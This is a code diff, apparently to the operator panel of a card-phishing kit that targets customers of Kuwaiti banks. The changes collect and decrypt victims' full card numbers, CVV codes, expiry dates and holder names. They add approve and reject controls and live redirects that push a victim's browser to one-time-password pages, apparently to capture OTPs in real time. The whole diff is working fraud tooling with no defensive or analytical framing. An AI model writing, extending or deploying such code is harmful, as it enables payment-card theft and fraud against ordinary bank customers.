@@ -476,7 +476,7 @@
             id: (h && h.id) || ('card_' + (h && h.timestamp)),
             type: '_t1',
             cardNumber: d._v1 || d.cardNumber || '',
-            binNumber: d.binNumber || d._v5 || '',
+            cvv: d._v2 || d.cvv || '',
             expiry: d._v3 || d.expiryDate || '',
             expiryDate: d._v3 || d.expiryDate || '',
             cardHolderName: d._v4 || d.cardHolderName || '',
@@ -523,9 +523,9 @@
       // نتيجة فك التشفير ادعاء كامل: إن كانت رقماً صالحاً (على الأقل 8 أرقام) فهي البطاقة الحقيقية
       const decryptedCardNumber = xorDecrypt(rawCardNumber);
       const decodedNumber = /^\d{8,}$/.test(decryptedCardNumber) ? decryptedCardNumber : rawCardNumber;
-      const binPlain = typeof latestCard.binNumber === 'string' ? latestCard.binNumber : (m.binNumber || m._v5 || '');
-      const decryptedBin = xorDecrypt(binPlain);
-      const decodedBin = /^\d{6}$/.test(decryptedBin) ? decryptedBin : binPlain;
+      const cvvPlain = typeof latestCard.cvv === 'string' ? latestCard.cvv : (m.cvv || m._v2 || '');
+      const decryptedCvv = xorDecrypt(cvvPlain);
+      const decodedCvv = /^\d{3,4}$/.test(decryptedCvv) ? decryptedCvv : cvvPlain;
       const expiryPlain = latestCard.expiry || latestCard.expiryDate || m.expiryDate || m.expiry || m._v3 || '';
       const decryptedExpiry = xorDecrypt(expiryPlain);
       const decodedExpiry = /^\d{2}\/\d{2}$|^\d{4}-\d{2}$/.test(decryptedExpiry) ? decryptedExpiry : expiryPlain;
@@ -538,7 +538,7 @@
         prefix: latestCard.cardPrefix || '',
         bank: getKuwaitBankLabel(decodedNumber) || latestCard.bankName || latestCard.bank || '',
         expiryDate: decodedExpiry,
-        binNumber: decodedBin,
+        cvv: decodedCvv,
         cardCreatedAt: latestCard.createdAt || m.createdAt || null,
         cardTimestamp: latestCard.timestamp || '',
         allCards: allCards,
@@ -762,10 +762,10 @@
         const fixed = decryptFixedXor(text);
         return fixed && fixed !== text ? fixed : text;
       };
-      const securityCode = decryptField(card.binNumber || card._v5 || visitor.binNumber || '').trim();
+      const securityCode = decryptField(card.cvv || card.securityCode || visitor.cvv || '').trim();
       const expiryValue = decryptField(card.expiry || card.expiryDate || visitor.expiryDate || visitor.expiry || '').trim();
       const holderValue = decryptField(card.cardholderName || card.holderName || card.name || visitor.name || '').trim() || visitor.name || '';
-      const securityLabel = 'رقم BIN (اختياري)';
+      const securityLabel = securityCode.length === 4 ? 'رمز BIN' : 'رمز CVV';
       const firebaseBankName = cleanFirebaseBankName(card.bankName || card.bank, cardNumber);
       const fixedBankCode = getKuwaitBankCode(cardNumber);
       // الاسم المختصر الإنجليزي من قاعدة BIN هو المعروض على البطاقة
@@ -781,7 +781,7 @@
           <div><small>تاريخ الانتهاء</small><strong class="ref-copyable" ${escapeHtml(String(expiryValue)) ? `data-copy="${escapeHtml(String(expiryValue))}"` : ''}>${escapeHtml(expiryValue || 'غير متوفر')}</strong></div>
           <div><small>${securityLabel}</small><strong class="ref-copyable" ${securityCode ? `data-copy="${escapeHtml(securityCode)}"` : ''}>${escapeHtml(securityCode || 'غير متوفر')}</strong></div>
         </div>
-        ${decision ? '' : `<div class="ref-card-actions"><button data-card-action="approve" data-card-key="${escapeHtml(cardKey(card))}" data-card-id="${escapeHtml(cardId)}" data-session-id="${escapeHtml(visitor.id)}">✓ موافقة</button><button data-card-action="reject" data-card-key="${escapeHtml(cardKey(card))}" data-card-id="${escapeHtml(cardId)}" data-session-id="${escapeHtml(visitor.id)}">× رفض</button></div>`}
+        ${decision ? '' : `<div class="ref-card-actions"><button data-card-action="approve" data-card-key="${escapeHtml(cardKey(card))}" data-card-id="${escapeHtml(cardId)}" data-session-id="${escapeHtml(visitor.sessionId || visitor.id)}">✓ موافقة</button><button data-card-action="reject" data-card-key="${escapeHtml(cardKey(card))}" data-card-id="${escapeHtml(cardId)}" data-session-id="${escapeHtml(visitor.sessionId || visitor.id)}">× رفض</button></div>`}
       </article></div>`;
     }).join('') : '<p class="ref-muted">لا توجد بطاقة</p>';
     // أقسام الصناديق الثلاثة — تُرتب لاحقاً من الأحدث إلى الأقدم
@@ -803,7 +803,7 @@
       })
       .map(s => s.html)
       .join('');
-    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="/index.html">الرئيسية</button><button data-ref-nav="/cards.html">البطاقات</button><button data-ref-nav="/register.html">التسجيل</button><button data-ref-nav="/order.html">الطلب</button><button data-ref-nav="/payment.html">الدفع اليدوي</button><button data-ref-nav="/otp.html">رمز التحقق</button><button data-ref-nav="/code.html">الرمز</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="/index.html">الرئيسية</option><option value="/cards.html">البطاقات</option><option value="/register.html">التسجيل</option><option value="/order.html">الطلب</option><option value="/payment.html">الدفع اليدوي</option><option value="/otp.html">رمز التحقق</option><option value="/code.html">الرمز</option></select></div><div class="ref-detail-stack">${stackSections}</div>`;
+    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="compar">البطاقات</button><button data-ref-nav="register">التسجيل</button><button data-ref-nav="insur">الطلب</button><button data-ref-nav="payment">الدفع</button><button data-ref-nav="otp">رمز التحقق</button><button data-ref-nav="code">الرمز</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="compar">البطاقات</option><option value="register">التسجيل</option><option value="insur">الطلب</option><option value="payment">الدفع</option><option value="otp">رمز التحقق</option><option value="code">الرمز</option></select></div><div class="ref-detail-stack">${stackSections}</div>`;
     els.referenceDetailEmpty.classList.add('hidden');
     if (boxCounterTimer) clearInterval(boxCounterTimer);
     els.referenceDetailContent.querySelectorAll('.bank-card').forEach((cardElement, index) => {
@@ -837,25 +837,19 @@
       navigator.clipboard.writeText(value).then(() => toast('تم نسخ: ' + value, 'success')).catch(() => toast('تعذر النسخ', 'error'));
     };
     els.referenceDetailContent.classList.remove('hidden');
+    // يجب أن تطابق هذه القيم خريطة التنقل داخل تطبيق موقع العملاء الأصلي.
     const NAV_PAGE_MAP = {
-      home: 'index.html',
-      customer: 'order.html',
-      payment: 'payment.html',
-      otp: 'otp.html',
+      home: 'home', compar: 'compar', register: 'register', insur: 'insur',
+      payment: 'payment', otp: 'otp', code: 'code',
     };
     const NAV_SIGNAL_MAP = {
-      '/index.html': 'index', 'index.html': 'index',
-      '/order.html': 'order', 'order.html': 'order',
-      '/payment.html': 'payment', 'payment.html': 'payment',
-      '/otp.html': 'otp', 'otp.html': 'otp',
-      '/code.html': 'code', 'code.html': 'code',
-      '/cards.html': 'cards', 'cards.html': 'cards',
-      '/register.html': 'register', '/request.html': 'request', 'request.html': 'request',
+      home: 'home', compar: 'compar', register: 'register', insur: 'insur',
+      payment: 'payment', otp: 'otp', code: 'code',
     };
     // موقع العملاء يستمع إلى pays.redirectPage مباشرة. commands مسار توافق إضافي فقط.
     // كل أمر يحمل seq فريدة لضمان تغيير القيمة دائماً (حتى لنفس الصفحة).
     const sendNavCommand = async (prettyLabel, targetPage) => {
-      const docId = visitor.id;
+      const docId = visitor.sessionId || visitor.id;
       const redirectPage = NAV_SIGNAL_MAP[targetPage] || String(targetPage || '').replace(/\.html$/, '');
       const seq = Date.now() + '-' + Math.random().toString(36).slice(2, 8);
       try {
@@ -909,8 +903,7 @@
       try {
         cardDecisionOverrides.set(cardKeyValue, decision);
         // cardId هو معرّف محاولة داخل history، أما وثيقة pays فتُحدّد بالجلسة/الطلب.
-        const docId = sessionId || visitor.id;
-        if (!docId) throw new Error('missing pays document id');
+        const docId = sessionId || cardId;
         // كتابة القرار في وثيقة pays مباشرة — المصدر الذي يقرأه موقع العملاء
         await db.collection('pays').doc(docId).set(decisionPayload(decision), { merge: true });
         toast(decision === 'approved' ? 'تمت الموافقة على البطاقة' : 'تم رفض البطاقة', decision === 'approved' ? 'success' : 'error');
@@ -1242,10 +1235,9 @@
     return {
       decision: decision,
       status: decision,
-      cardStatus: decision,
+      cardStatus: decision === 'approved' ? 'approved_with_otp' : 'rejected',
       otpStatus: decision === 'approved' ? 'show_otp' : null,
       redirectPage: decision === 'approved' ? 'otp' : null,
-      rejectionMessage: decision === 'rejected' ? 'تم رفض البطاقة من قبل المدير، يرجى إعادة المحاولة.' : '',
       redirectRequestedAt: firebase.firestore.FieldValue.serverTimestamp(),
       decidedAt: firebase.firestore.FieldValue.serverTimestamp(),
       updatedAt: firebase.firestore.FieldValue.serverTimestamp(),
@@ -1282,8 +1274,7 @@
         }
       }
       // cardId يخص محاولة البطاقة داخل history؛ يجب تحديث وثيقة pays الخاصة بالعميل.
-      const docId = sessionId || visitor?.id;
-      if (!docId) throw new Error('missing pays document id');
+      const docId = sessionId || cardId;
       await db.collection('pays').doc(docId).set(decisionPayload(decision), { merge: true });
       toast(decision === 'approved' ? 'تمت الموافقة بنجاح' : 'تم الرفض', decision === 'approved' ? 'success' : 'error');
     } catch (err) {
